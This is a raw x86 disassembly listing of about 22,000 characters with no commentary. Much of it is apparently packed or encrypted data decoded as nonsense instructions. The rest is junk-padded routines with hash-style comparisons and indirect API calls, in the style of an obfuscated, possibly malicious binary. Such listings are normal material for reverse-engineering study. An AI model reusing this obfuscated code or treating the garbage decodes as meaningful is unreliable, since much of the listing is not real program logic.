  41adba:	fcom   QWORD PTR [esi]
  41adbc:	cmp    bl,BYTE PTR [ebx+0x0]
  41adbf:	imul   ebp,ebp,0x5f80db83
  41adc5:	mov    esi,0x885355da
  41adca:	not    BYTE PTR [edi]
  41adcc:	aam    0xb3
  41adce:	retf   0xd41a
  41add1:	cmp    ecx,DWORD PTR [edi-0x4db2a699]
  41add7:	fwait
  41add8:	nop
  41add9:	nop
  41adda:	cld    
  41addb:	jns    0x41ade4
  41addd:	ret    
  41adde:	mov    ah,0x0
  41ade0:	(bad)  
  41ade2:	int    0x8d
  41ade4:	adc    al,0xac
  41ade6:	pop    esi
  41ade7:	in     al,0x4d
  41ade9:	lods   eax,DWORD PTR ds:[esi]
  41adea:	std    
  41adeb:	mov    BYTE PTR [edi+0x1c444ae6],al
  41adf1:	sar    DWORD PTR [edi+0x393d13e4],cl
  41adf7:	cdq    
  41adf8:	jne    0x41ade4
  41adfa:	das    
  41adfb:	or     al,0x4e
  41adfd:	push   es
  41adfe:	sub    dh,ch
  41ae00:	lea    ebp,[esi-0x2d]
  41ae03:	dec    edx
  41ae04:	outs   dx,BYTE PTR ds:[esi]
  41ae05:	mov    esi,0xaafb4f24
  41ae0a:	into   
  41ae0b:	sub    esi,ecx
  41ae0d:	inc    edx
  41ae0e:	sbb    BYTE PTR [edx-0x28028041],al
  41ae14:	mov    cl,0xe9
  41ae16:	sbb    esp,esp
  41ae18:	jo     0x41adeb
  41ae1a:	or     DWORD PTR [ebx+ebx*1],ebp
  41ae1d:	outs   dx,BYTE PTR ds:[esi]
  41ae1e:	jecxz  0x41adfd
  41ae20:	fmul   QWORD PTR [edx]
  41ae22:	std    
  41ae23:	push   cs
  41ae24:	jp     0x41ae72
  41ae26:	daa    
  41ae27:	xchg   esp,eax
  41ae28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae29:	aam    0xb9
  41ae2b:	sub    DWORD PTR [ebx+0x52],ecx
  41ae2e:	(bad)  
  41ae2f:	mov    cl,0x10
  41ae31:	adc    dh,dl
  41ae33:	mov    bl,0xa5
  41ae35:	xchg   BYTE PTR [eax],dh
  41ae37:	popa   
  41ae38:	dec    ebx
  41ae39:	mov    esi,0x8f3b80f2
  41ae3e:	loop   0x41adcd
  41ae40:	sub    dh,BYTE PTR ds:0xeb76a30a
  41ae46:	jl     0x41ae86
  41ae48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae49:	xchg   DWORD PTR [ecx-0x6b5e118e],ebp
  41ae4f:	mov    esi,0x4831d8c0
  41ae54:	push   ebx
  41ae55:	out    0x6c,eax
  41ae57:	xchg   DWORD PTR [ebx],eax
  41ae59:	out    dx,eax
  41ae5a:	push   ebp
  41ae5b:	ja     0x41aea0
  41ae5d:	jl     0x41ae0b
  41ae5f:	and    ebx,eax
  41ae61:	sbb    BYTE PTR [esi+0x2ae12daf],0x0
  41ae68:	add    BYTE PTR ds:0x6f90,ah
  41ae6e:	mov    DWORD PTR [esp+0x30],eax
  41ae72:	mov    DWORD PTR [esp+0x10],0x1515
  41ae7a:	mov    eax,DWORD PTR [esp+0x10]
  41ae7e:	jmp    0x41b0db
  41ae83:	sub    al,0xff
  41ae85:	jmp    0xe1b3:0xbcbce956
  41ae8c:	in     al,0x38
  41ae8e:	xchg   edx,eax
  41ae8f:	lsl    esp,di
  41ae92:	jecxz  0x41ae77
  41ae94:	xor    eax,eax
  41ae96:	mov    esi,0xbebec235
  41ae9b:	into   
  41ae9c:	in     al,0x61
  41ae9e:	xchg   esp,eax
  41ae9f:	and    bl,cl
  41aea1:	pusha  
  41aea2:	inc    edi
  41aea3:	rol    BYTE PTR [ebx+0x3145159],0x2f
  41aeaa:	jmp    0x41ae8b
  41aeac:	enter  0x9782,0xc3
  41aeb0:	or     esp,DWORD PTR [edi]
  41aeb2:	xor    al,0x55
  41aeb4:	enter  0x1db5,0x16
  41aeb8:	xchg   ebx,eax
  41aeb9:	dec    ebp
  41aeba:	addr16 jge 0x41ae3e
  41aebd:	sahf   
  41aebe:	cmp    esp,DWORD PTR [ebp-0x6d72cdae]
  41aec4:	jne    0x41aeae
  41aec6:	sub    ecx,ebp
  41aec8:	add    DWORD PTR ds:0x7b579d5e,edx
  41aece:	(bad)  
  41aecf:	jbe    0x41af1a
  41aed1:	dec    ecx
  41aed2:	(bad)  
  41aed3:	loope  0x41aef7
  41aed5:	pop    esp
  41aed6:	imul   eax
  41aed8:	fcomp  QWORD PTR [esi+0x72fc4186]
  41aede:	or     BYTE PTR [edx+0x9f1ef3c],0x5d
  41aee5:	dec    DWORD PTR [edi+0x17]
  41aee8:	int    0xa7
  41aeea:	or     edx,DWORD PTR [ecx+0x1a328683]
  41aef0:	add    dh,BYTE PTR ds:0xbcb0587d
  41aef6:	fs sbb cl,al
  41aef9:	mov    ecx,0xec0f63fd
  41aefe:	loop   0x41aefc
  41af00:	imul   esp,DWORD PTR [esi-0x6ae95618],0x3d
  41af07:	cmp    DWORD PTR [esi],esp
  41af09:	in     al,dx
  41af0a:	push   es
  41af0b:	mov    ebp,DWORD PTR [eax+0x43ba019e]
  41af11:	fcompp 
  41af13:	push   cs
  41af14:	jo     0x41af39
  41af16:	sbb    DWORD PTR [ebx+ecx*8-0x2d52a652],0xffffff9a
  41af1e:	sub    DWORD PTR [ebp-0x9],0x1216e18f
  41af25:	add    bl,BYTE PTR [edx+0x58]
  41af28:	or     eax,0xee21239f
  41af2d:	dec    ebp
  41af2e:	mov    ah,BYTE PTR [eax-0x3cb9cd49]
  41af34:	frstor [ecx+eax*4+0x61]
  41af38:	add    bh,BYTE PTR [edx]
  41af3a:	pusha  
  41af3b:	mov    bh,0x9e
  41af3d:	std    
  41af3e:	ret    0x76a9
  41af41:	mov    ds:0x8447819a,al
  41af46:	icebp  
  41af47:	pop    esp
  41af48:	jmp    0x4089:0x42848c38
  41af4f:	dec    edi
  41af50:	fcomp  QWORD PTR [eax+0x3]
  41af53:	cdq    
  41af54:	in     al,dx
  41af55:	cmp    DWORD PTR [ebp+0x62],0xdc4a29e3
  41af5c:	repnz in eax,dx
  41af5e:	aam    0xc1
  41af60:	rcr    DWORD PTR [ecx-0x75],cl
  41af63:	xchg   BYTE PTR [ebx-0x2c6fd04d],bl
  41af69:	jg     0x41afa5
  41af6b:	or     al,0xc9
  41af6d:	mov    dl,0x10
  41af6f:	pusha  
  41af70:	mov    DWORD PTR [esi],ebp
  41af72:	dec    edx
  41af73:	mov    WORD PTR [ebp+0x27f4669d],ds
  41af79:	std    
  41af7a:	popa   
  41af7b:	sbb    al,0x14
  41af7d:	enter  0x7e6a,0xd
  41af81:	jp     0x41af9b
  41af83:	test   BYTE PTR [esi+0x54d820a4],ah
  41af89:	(bad)  
  41af8b:	mov    eax,ds:0x3586f6c7
  41af90:	rcl    DWORD PTR [ebx],0x7a
  41af93:	inc    ebx
  41af94:	adc    BYTE PTR [ebp+0x1c],bl
  41af97:	lahf   
  41af98:	test   DWORD PTR [edx],esi
  41af9a:	xor    edi,DWORD PTR [edx+0x6a0eb582]
  41afa0:	int3   
  41afa1:	mov    bl,0x31
  41afa3:	fidivr WORD PTR [edx-0x3185091e]
  41afa9:	aas    
  41afaa:	xchg   DWORD PTR [ebx+0x75dcd7c2],ebp
  41afb0:	repz call 0x7fea7221
  41afb6:	push   ss
  41afb7:	sub    DWORD PTR [esi+edi*4+0x11344cf3],eax
  41afbe:	xor    DWORD PTR [ecx],eax
  41afc0:	call   FWORD PTR [ecx-0x5c972d07]
  41afc6:	lods   eax,DWORD PTR ds:[esi]
  41afc7:	imul   edi,DWORD PTR [esi],0x63
  41afca:	xor    ah,BYTE PTR [esi+eax*2+0x2b5ba1b1]
  41afd1:	sbb    dh,BYTE PTR [esp+edx*2+0x66]
  41afd5:	inc    ebx
  41afd6:	in     al,dx
  41afd7:	and    eax,0x7bbb8588
  41afdc:	outs   dx,DWORD PTR ds:[esi]
  41afdd:	aaa    
  41afde:	outs   dx,DWORD PTR ds:[esi]
  41afdf:	mov    bh,0xf4
  41afe1:	mov    esi,0x490cea87
  41afe6:	cmp    DWORD PTR [bp+di+0x21d3],ebx
  41afeb:	dec    edi
  41afec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afed:	lock cdq 
  41afef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aff0:	je     0x41b031
  41aff2:	mov    dh,0x6b
  41aff4:	rol    BYTE PTR [edx-0x326a810b],0x3f
  41affb:	cmc    
  41affc:	adc    BYTE PTR [edi-0x7baad3ea],ch
  41b002:	inc    esp
  41b003:	mov    al,ds:0xfcace3a5
  41b008:	sub    eax,0x58d3b703
  41b00d:	imul   DWORD PTR ds:0xc8f57c79
  41b013:	mov    ecx,0x809a339f
  41b018:	xchg   BYTE PTR [eax],ah
  41b01a:	add    bh,ch
  41b01c:	pushf  
  41b01d:	and    eax,0xe645a2f
  41b022:	cmp    BYTE PTR [ebp+ecx*4+0x3623c070],dl
  41b029:	fst    QWORD PTR [ebp+0x72]
  41b02c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b02d:	retf   0x9cce
  41b030:	int3   
  41b031:	mov    dl,0xc0
  41b033:	inc    edx
  41b034:	or     al,BYTE PTR [esi+0x3f]
  41b037:	aad    0x59
  41b039:	lea    ebx,[ecx+0x3d33ecd1]
  41b03f:	cmp    eax,0x9e09e8f0
  41b045:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b046:	and    BYTE PTR [edx],bh
  41b048:	cmp    BYTE PTR [esi+0x18b68117],dh
  41b04e:	scas   eax,DWORD PTR es:[edi]
  41b04f:	mov    esi,0x4eb6230e
  41b054:	add    eax,0xc16420d0
  41b059:	or     al,0x3b
  41b05b:	outs   dx,BYTE PTR ds:[esi]
  41b05c:	push   esi
  41b05d:	outs   dx,DWORD PTR ds:[esi]
  41b05e:	jno    0x41b048
  41b060:	(bad)  
  41b061:	push   ss
  41b062:	jbe    0x41b037
  41b064:	test   eax,0xbebb4873
  41b069:	dec    ecx
  41b06a:	xor    eax,DWORD PTR [edi-0x7aea465]
  41b070:	mov    ebp,0x85859f3f
  41b075:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b076:	sub    eax,0x7488cdfa
  41b07b:	mov    edi,0x895aff83
  41b080:	(bad)  
  41b081:	in     al,dx
  41b082:	cmp    ah,cl
  41b084:	mov    edx,0xa7ef02f7
  41b089:	cwde   
  41b08a:	jnp    0x41b01e
  41b08c:	adc    al,0xc4
  41b08e:	mov    bl,0xdb
  41b090:	pop    es
  41b091:	in     eax,0xc3
  41b093:	cmp    al,0x4f
  41b095:	ja     0x41b068
  41b097:	scas   eax,DWORD PTR es:[edi]
  41b098:	mov    eax,ds:0x6004dc4d
  41b09d:	jno    0x41b05b
  41b09f:	mov    WORD PTR ds:0xaf72f6f9,ss
  41b0a5:	mov    dh,0x86
  41b0a7:	idiv   esi
  41b0a9:	scas   eax,DWORD PTR es:[edi]
  41b0aa:	pop    edx
  41b0ab:	das    
  41b0ac:	mov    dl,0xc7
  41b0ae:	fsubr  st(1),st
  41b0b0:	bound  eax,QWORD PTR [esi]
  41b0b2:	push   edi
  41b0b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0b4:	pushf  
  41b0b5:	outs   dx,DWORD PTR ds:[esi]
  41b0b6:	xchg   ecx,eax
  41b0b7:	mov    cl,0x31
  41b0b9:	push   eax
  41b0ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0bb:	leave  
  41b0bc:	pop    ss
  41b0bd:	push   ebp
  41b0be:	aas    
  41b0bf:	mov    ah,0xa6
  41b0c1:	daa    
  41b0c2:	loopne 0x41b107
  41b0c4:	rol    DWORD PTR [ecx],cl
  41b0c6:	pop    ecx
  41b0c7:	pushf  
  41b0c8:	pusha  
  41b0c9:	sub    DWORD PTR [ecx],esp
  41b0cb:	in     eax,dx
  41b0cc:	imul   ebx,DWORD PTR [esi-0x7],0xcf09697d
  41b0d3:	das    
  41b0d4:	push   es
  41b0d5:	sbb    dh,BYTE PTR [ebp+0x53]
  41b0d8:	xor    eax,0x4c8b08f1
  41b0dd:	and    al,0x30
  41b0df:	or     eax,0x7113
  41b0e4:	add    eax,0x3d6a
  41b0e9:	cmp    ecx,eax
  41b0eb:	je     0x41b438
  41b0f1:	mov    eax,DWORD PTR [esp+0x40]
  41b0f5:	mov    edx,DWORD PTR [esp+0x18]
  41b0f9:	mov    edi,DWORD PTR [esp+0x1c]
  41b0fd:	xor    ecx,ecx
  41b0ff:	shld   ecx,eax,0x2
  41b103:	shl    eax,0x2
  41b106:	xor    eax,ebx
  41b108:	xor    ecx,esi
  41b10a:	cmp    eax,edx
  41b10c:	jne    0x41b11a
  41b112:	cmp    ecx,edi
  41b114:	je     0x41b3f1
  41b11a:	mov    eax,DWORD PTR [esp+0x44]
  41b11e:	mov    eax,DWORD PTR [esp+0x44]
  41b122:	mov    eax,DWORD PTR [esp+0x44]
  41b126:	mov    ecx,DWORD PTR [esp+0x44]
  41b12a:	jmp    0x41b387
  41b12f:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b131:	lea    ecx,[ecx-0x67]
  41b134:	jnp    0x41b171
  41b136:	mov    bh,0x0
  41b138:	lods   al,BYTE PTR ds:[esi]
  41b139:	dec    esp
  41b13a:	xchg   edx,eax
  41b13b:	fsubr  st,st(2)
  41b13d:	in     eax,0xe3
  41b13f:	pop    esp
  41b140:	xor    eax,0xc235bec0
  41b145:	mov    esi,0x694ceebe
  41b14a:	xchg   esp,eax
  41b14b:	dec    ebx
  41b14c:	mov    edi,0xcfea891
  41b151:	retf   
  41b152:	(bad)  
  41b154:	arpl   WORD PTR [edx],dx
  41b156:	ja     0x41b15c
  41b158:	(bad)  
  41b159:	in     eax,dx
  41b15a:	fmul   QWORD PTR [eax-0x478125f9]
  41b160:	call   0xfd78561a
  41b165:	inc    esp
  41b166:	cs ins BYTE PTR es:[edi],dx
  41b168:	push   ds
  41b169:	aam    0x5b
  41b16b:	push   ebp
  41b16c:	mov    eax,ds:0xc140e468
  41b171:	mov    cl,0xf0
  41b173:	cmp    DWORD PTR [ecx],ecx
  41b175:	dec    esi
  41b176:	test   al,0xcd
  41b178:	lock stos BYTE PTR es:[edi],al
  41b17a:	mov    dh,BYTE PTR ds:0x6e80cf49
  41b180:	ds xchg esi,eax
  41b182:	adc    eax,0x22a394c6
  41b187:	xchg   ecx,eax
  41b188:	pop    ss
  41b189:	fstp   QWORD PTR [esi-0x2f]
  41b18c:	add    bl,bl
  41b18e:	jle    0x41b125
  41b190:	fmul   DWORD PTR [esi-0x5724f4d8]
  41b196:	ret    0x23e
  41b199:	lahf   
  41b19a:	or     BYTE PTR [ebx],dh
  41b19c:	xlat   BYTE PTR ds:[ebx]
  41b19d:	je     0x41b1af
  41b19f:	inc    eax
  41b1a0:	mov    ds,WORD PTR [ecx+0x37f74ad5]
  41b1a6:	jg     0x41b1b5
  41b1a8:	push   0xffffffa3
  41b1aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1ab:	inc    ecx
  41b1ac:	lock xor BYTE PTR [eax+0x31449dc8],0xba
  41b1b4:	shl    DWORD PTR [edx],1
  41b1b6:	mov    esi,0x3b9ae9c
  41b1bb:	test   BYTE PTR [esi-0x60ea1792],0x88
  41b1c2:	mov    ds:0x5b7e6f2b,eax
  41b1c7:	push   ss
  41b1c8:	and    esp,DWORD PTR [edi]
  41b1ca:	mov    esp,DWORD PTR [edi]
  41b1cc:	pop    edx
  41b1cd:	pop    ebp
  41b1ce:	push   ss
  41b1cf:	jp     0x41b1eb
  41b1d1:	jp     0x41b1bd
  41b1d3:	mov    DWORD PTR [ebx+eiz*1+0x45],ebp
  41b1d7:	sti    
  41b1d8:	or     al,0xd
  41b1da:	int3   
  41b1db:	inc    esi
  41b1dc:	test   eax,0x80ec9ba9
  41b1e1:	loope  0x41b216
  41b1e3:	or     BYTE PTR [ebx+0x13c10b58],0x95
  41b1ea:	sub    BYTE PTR [ebx],bl
  41b1ec:	sub    BYTE PTR [eax-0x41],al
  41b1ef:	cdq    
  41b1f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1f1:	call   0x5974:0xf85edb80
  41b1f8:	add    BYTE PTR [edx],bh
  41b1fa:	mov    esp,0xd4614d4f
  41b1ff:	retf   
  41b200:	inc    esi
  41b201:	sahf   
  41b202:	pop    esi
  41b203:	test   cl,bh
  41b205:	loop   0x41b1ca
  41b207:	adc    dl,dl
  41b209:	push   esi
  41b20a:	and    al,0x8f
  41b20c:	hlt    
  41b20d:	mov    ebp,0xe3fce4f3
  41b212:	popf   
  41b213:	loopne 0x41b203
  41b215:	jge    0x41b23c
  41b217:	or     DWORD PTR [edi+eiz*4-0x42],edx
  41b21b:	sbb    al,0x53
  41b21d:	sbb    bl,bh
  41b21f:	dec    edi
  41b220:	pop    ss
  41b221:	and    bh,BYTE PTR [edi]
  41b223:	mov    edi,0x5a9339c7
  41b228:	daa    
  41b229:	mov    al,0x2b
  41b22b:	aam    0x25
  41b22d:	sar    esi,cl
  41b22f:	out    dx,al
  41b230:	mov    ds:0x94820ba3,eax
  41b235:	mov    ch,0x8f
  41b237:	mov    ebp,0x9df2c86b
  41b23c:	jp     0x41b231
  41b23e:	xchg   BYTE PTR [ecx],bh
  41b240:	retf   0x40a3
  41b243:	push   esi
  41b244:	fmul   st(1),st
  41b246:	lods   eax,DWORD PTR ds:[esi]
  41b247:	push   ebp
  41b248:	push   0x74
  41b24a:	mov    cl,0x3f
  41b24c:	jle    0x41b241
  41b24e:	mul    DWORD PTR [ebp-0x32ef1a2d]
  41b254:	sub    dh,al
  41b256:	push   edi
  41b257:	fsub   QWORD PTR [ebx-0x6]
  41b25a:	mov    al,0xa1
  41b25c:	cmp    DWORD PTR [edx+0x6259baa9],esp
  41b262:	call   0xa92a:0xc8134ecc
  41b269:	lods   eax,DWORD PTR ds:[esi]
  41b26a:	call   0x2a4c202a
  41b26f:	mov    ch,0x12
  41b271:	push   edi
  41b272:	pop    ebx
  41b273:	enter  0xb605,0xb3
  41b277:	ins    DWORD PTR es:[edi],dx
  41b278:	push   esp
  41b279:	dec    edi
  41b27a:	loope  0x41b230
  41b27c:	push   eax
  41b27d:	cmp    cl,ch
  41b27f:	aas    
  41b280:	bnd call DWORD PTR [eiz*4-0x6ae73f5d]
  41b288:	test   eax,0x66cd57a7
  41b28d:	cmp    al,BYTE PTR [ebx-0x31]
  41b290:	imul   eax,DWORD PTR [edx+0x5f],0x69ab5e94
  41b297:	iret   
  41b298:	mov    WORD PTR [ebx+0x18],ds
  41b29b:	in     al,0xb0
  41b29d:	fdiv   QWORD PTR [eax]
  41b29f:	sub    dl,ah
  41b2a1:	xchg   esp,eax
  41b2a2:	mov    al,0x59
  41b2a4:	in     al,0x9e
  41b2a6:	aaa    
  41b2a7:	inc    esp
  41b2a8:	mov    ebx,0xcb9bb652
  41b2ad:	int3   
  41b2ae:	push   0xffffffb6
  41b2b0:	call   0x43de3088
  41b2b5:	rol    BYTE PTR [eax-0x14],0x3d
  41b2b9:	mov    edx,0xa76306e
  41b2be:	adc    ecx,esi
  41b2c0:	rcl    eax,1
  41b2c2:	lahf   
  41b2c3:	fs scas al,BYTE PTR es:[edi]
  41b2c5:	imul   ebx,DWORD PTR [edi+0x57],0x31
  41b2c9:	pop    esi
  41b2ca:	pop    ds
  41b2cb:	das    
  41b2cc:	pop    ebx
  41b2cd:	sub    BYTE PTR [edx-0x4a15c585],cl
  41b2d3:	inc    eax
  41b2d4:	imul   ebp,DWORD PTR [edi+0x6],0xad97e358
  41b2db:	data16 loopne 0x41b276
  41b2de:	inc    esi
  41b2df:	mov    edi,0xc4da9485
  41b2e4:	retf   
  41b2e5:	repz mov ebp,ds
  41b2e8:	inc    esp
  41b2e9:	(bad)  
  41b2ea:	or     DWORD PTR [ebp+0x27],0x5ca8471b
  41b2f1:	sbb    al,0xc7
  41b2f3:	sub    cl,BYTE PTR [edx+0x26a7880f]
  41b2f9:	adc    BYTE PTR [eax-0x7ad81b3c],dl
  41b2ff:	mov    ebp,0xb42cad6c
  41b304:	and    DWORD PTR fs:[bx+0x17e9],esp
  41b30a:	add    al,0x97
  41b30c:	mov    ecx,0x761d275c
  41b311:	sar    DWORD PTR [ebx-0x6b],cl
  41b314:	dec    ecx
  41b315:	fbld   TBYTE PTR [esi+0x30f41214]
  41b31b:	jmp    0xf2cf:0x942dbe4f
  41b322:	imul   esi,esi,0x7
  41b325:	(bad)  
  41b326:	mov    ecx,0x5b2f094e
  41b32b:	adc    bl,bl
  41b32d:	sub    eax,ebp
  41b32f:	icebp  
  41b330:	inc    ebp
  41b331:	fisub  DWORD PTR [edi+0x4]
  41b334:	mov    eax,ds:0x39d5ef5a
  41b339:	sbb    al,0xe0
  41b33b:	sbb    BYTE PTR [edi*1-0x5fe8e503],bl
  41b342:	cli    
  41b343:	fbstp  TBYTE PTR [ecx]
  41b345:	pop    ecx
  41b346:	and    ecx,esi
  41b348:	js     0x41b36c
  41b34a:	rcr    BYTE PTR [edi+ecx*1-0x5b8aa314],0xc1
  41b352:	mov    dh,0xf
  41b354:	mov    al,0xc1
  41b356:	in     al,dx
  41b357:	dec    ecx
  41b358:	cli    
  41b359:	aam    0x0
  41b35b:	sbb    bh,BYTE PTR [ecx-0x2c]
  41b35e:	stos   DWORD PTR es:[edi],eax
  41b35f:	jo     0x41b2f3
  41b361:	std    
  41b362:	adc    eax,0xd17109aa
  41b367:	sbb    al,0x77
  41b369:	sbb    dh,0x68
  41b36c:	sub    ebp,DWORD PTR ds:0x1051049d
  41b372:	sub    esi,DWORD PTR [ebp-0x72af5768]
  41b378:	es cmp eax,0xf2def503
  41b37e:	add    eax,0x2574051d
  41b383:	in     al,0x36
  41b385:	cli    
  41b386:	lea    esi,ds:0xa5069baf
  41b38c:	xor    ecx,0xfffffffe
  41b38f:	shr    eax,0x2
  41b392:	shl    ecx,0x1e
  41b395:	or     eax,ecx
  41b397:	xor    ecx,ecx
  41b399:	shld   ecx,eax,0x2
  41b39d:	shl    eax,0x2
  41b3a0:	xor    eax,ebx
  41b3a2:	xor    ecx,esi
  41b3a4:	cmp    eax,0xcb79b572
  41b3a9:	jne    0x41b3b7
  41b3af:	cmp    ecx,esi
  41b3b1:	je     0x41b438
  41b3b7:	mov    eax,DWORD PTR [esp+0x60]
  41b3bb:	cdq    
  41b3bc:	mov    eax,DWORD PTR [esp+0x60]
  41b3c0:	mov    ecx,edx
  41b3c2:	cdq    
  41b3c3:	shld   edx,eax,0x2
  41b3c7:	shr    ecx,0x1e
  41b3ca:	xor    edi,edi
  41b3cc:	shl    eax,0x2
  41b3cf:	or     eax,ecx
  41b3d1:	or     edx,edi
  41b3d3:	mov    ecx,edx
  41b3d5:	mov    edx,DWORD PTR [esp+0x18]
  41b3d9:	xor    eax,ebx
  41b3db:	xor    ecx,esi
  41b3dd:	mov    esi,DWORD PTR [esp+0x1c]
  41b3e1:	cmp    edx,eax
  41b3e3:	jne    0x41b3f1
  41b3e9:	cmp    esi,ecx
  41b3eb:	je     0x41b438
  41b3f1:	push   DWORD PTR ds:0x422818
  41b3f7:	push   DWORD PTR ds:0x4225ac
  41b3fd:	mov    eax,ds:0x422728
  41b402:	mov    eax,DWORD PTR [eax+0x1a4]
  41b408:	push   DWORD PTR [eax]
  41b40a:	mov    eax,DWORD PTR [esp+0x78]
  41b40e:	call   eax
  41b410:	mov    ecx,DWORD PTR ds:0x422728
  41b416:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41b41c:	mov    DWORD PTR [ecx],eax
  41b41e:	mov    eax,ds:0x422728
  41b423:	push   0x4
  41b425:	add    eax,0x1dc
  41b42a:	push   eax
  41b42b:	lea    eax,[esp+0x84]
  41b432:	push   eax
  41b433:	call   0x411c08
  41b438:	mov    eax,DWORD PTR [esp+0x7c]
  41b43c:	mov    eax,DWORD PTR [eax]
  41b43e:	pop    edi
  41b43f:	pop    esi
  41b440:	pop    ebx
  41b441:	mov    esp,ebp
  41b443:	pop    ebp
  41b444:	ret    0xc
  41b447:	push   ebp
  41b448:	mov    ebp,esp
  41b44a:	sub    esp,0x23c
  41b450:	push   ebx
  41b451:	cmp    DWORD PTR ds:0x428585,0x0
  41b458:	mov    DWORD PTR ds:0x42836d,0x2d97
  41b462:	mov    ecx,DWORD PTR ds:0x428485
  41b468:	mov    ecx,DWORD PTR ds:0x428459
  41b46e:	not    ecx
  41b470:	jmp    0x41b4da
  41b475:	mov    eax,ds:0x4284a1
  41b47a:	cmp    DWORD PTR ds:0x428585,0x0
  41b481:	jge    0x41b4c9
  41b487:	push   0x73dd
  41b48c:	push   DWORD PTR [ebp-0x18]
  41b48f:	push   0x428313
  41b494:	push   DWORD PTR [ebp-0x10]
  41b497:	push   DWORD PTR [ebp-0x14]
  41b49a:	call   DWORD PTR ds:0x42e108
  41b4a0:	neg    ecx
  41b4a2:	movzx  ecx,WORD PTR ds:0x428381
  41b4a9:	sbb    ecx,DWORD PTR ds:0x428471
  41b4af:	mov    DWORD PTR ds:0x428381,ecx
  41b4b5:	and    ecx,DWORD PTR ds:0x428591
  41b4bb:	xor    ecx,ecx
  41b4bd:	or     ecx,DWORD PTR ds:0x428491
  41b4c3:	or     DWORD PTR ds:0x428505,ecx
  41b4c9:	adc    ecx,ecx
  41b4cb:	xor    ecx,ecx
  41b4cd:	movzx  ecx,BYTE PTR ds:0x428431
  41b4d4:	or     DWORD PTR ds:0x428439,ecx
  41b4da:	push   esi
  41b4db:	push   edi
  41b4dc:	cmp    DWORD PTR ds:0x42859d,0x0
  41b4e3:	mov    ecx,0x4e26
  41b4e8:	mov    DWORD PTR ds:0x428591,ebx
  41b4ee:	mov    DWORD PTR ds:0x42843d,ecx
  41b4f4:	mov    DWORD PTR ds:0x42850d,edx
  41b4fa:	jmp    0x41b569
  41b4ff:	mov    DWORD PTR ds:0x428391,0x7065
  41b509:	cmp    DWORD PTR ds:0x42859d,0x0
  41b510:	jae    0x41b54d
  41b516:	push   0x1ec2
  41b51b:	push   DWORD PTR [ebp-0x10]
  41b51e:	push   DWORD PTR [ebp-0x10]
  41b521:	push   0x8dff
  41b526:	push   DWORD PTR [ebp-0x18]
  41b529:	push   0x428595
  41b52e:	call   DWORD PTR ds:0x42e290
  41b534:	xor    ecx,0x4175
  41b53a:	movzx  ecx,BYTE PTR ds:0x428489
  41b541:	or     ecx,DWORD PTR ds:0x42844d
  41b547:	mov    DWORD PTR ds:0x428489,ecx
  41b54d:	add    DWORD PTR ds:0x428429,edx
  41b553:	adc    ecx,0x68aa
  41b559:	add    DWORD PTR ds:0x428371,0x591d
  41b563:	dec    DWORD PTR ds:0x4284a1
  41b569:	mov    DWORD PTR [ebp-0x50],0x1
  41b570:	cmp    DWORD PTR ds:0x42859d,0x0
  41b577:	not    ecx
  41b579:	mov    DWORD PTR ds:0x428381,0x24a
  41b583:	jmp    0x41b5df
  41b588:	mov    DWORD PTR ds:0x428389,0x4cf4
  41b592:	mov    eax,0x7057
  41b597:	cmp    DWORD PTR ds:0x42859d,0x0
  41b59e:	jl     0x41b5c3
  41b5a4:	push   DWORD PTR [ebp-0xc]
  41b5a7:	call   DWORD PTR ds:0x42e10c
  41b5ad:	adc    ecx,DWORD PTR ds:0x42844d
  41b5b3:	sbb    DWORD PTR ds:0x428471,0x4277
  41b5bd:	and    DWORD PTR ds:0x4284f5,ecx
  41b5c3:	and    ecx,ecx
  41b5c5:	or     DWORD PTR ds:0x428495,0x5b0f
  41b5cf:	sbb    ecx,0x33b5
  41b5d5:	sub    DWORD PTR ds:0x42846d,0xb05
  41b5df:	mov    DWORD PTR [ebp-0xbc],0x61a1
  41b5e9:	xor    DWORD PTR ds:0x428389,0x1f8b
  41b5f3:	mov    DWORD PTR [ebp-0xb8],0x1
  41b5fd:	mov    ecx,DWORD PTR [ebp-0xb8]
  41b603:	mov    eax,0x584
  41b608:	xor    edx,edx
  41b60a:	div    ecx
  41b60c:	cmp    DWORD PTR ds:0x428521,0x0
  41b613:	mov    DWORD PTR ds:0x428385,0x2b7a
  41b61d:	mov    DWORD PTR ds:0x42856d,0x6434
  41b627:	mov    DWORD PTR ds:0x4284f5,0x53bf
  41b631:	jmp    0x41b6a4
  41b636:	mov    DWORD PTR ds:0x428465,edi
  41b63c:	movzx  ecx,WORD PTR ds:0x428381
  41b643:	cmp    DWORD PTR ds:0x428521,0x0
  41b64a:	jle    0x41b684
  41b650:	push   0x42844d
  41b655:	push   0x428489
  41b65a:	push   0x428425
  41b65f:	call   DWORD PTR ds:0x42e294
  41b665:	xor    DWORD PTR ds:0x428505,edi
  41b66b:	movzx  ecx,BYTE PTR ds:0x428361
  41b672:	sub    ecx,DWORD PTR ds:0x428469
  41b678:	mov    DWORD PTR ds:0x428361,ecx
  41b67e:	adc    DWORD PTR ds:0x428461,ecx
  41b684:	adc    ecx,0x4862
  41b68a:	and    ecx,DWORD PTR ds:0x428461
  41b690:	or     DWORD PTR ds:0x428505,ecx
  41b696:	mov    ecx,DWORD PTR ds:0x4284e1
  41b69c:	mov    ecx,DWORD PTR [ecx]
  41b69e:	sub    DWORD PTR ds:0x428489,ecx
  41b6a4:	imul   eax,eax,0x51d4
  41b6aa:	sub    ecx,0x11f6
  41b6b0:	mov    ecx,DWORD PTR [ebp-0xbc]
  41b6b6:	add    DWORD PTR ds:0x42844d,0x5690
  41b6c0:	xor    eax,ecx
  41b6c2:	adc    DWORD PTR ds:0x428585,edi
  41b6c8:	and    eax,0x4c09
  41b6cd:	sbb    ecx,0x3053
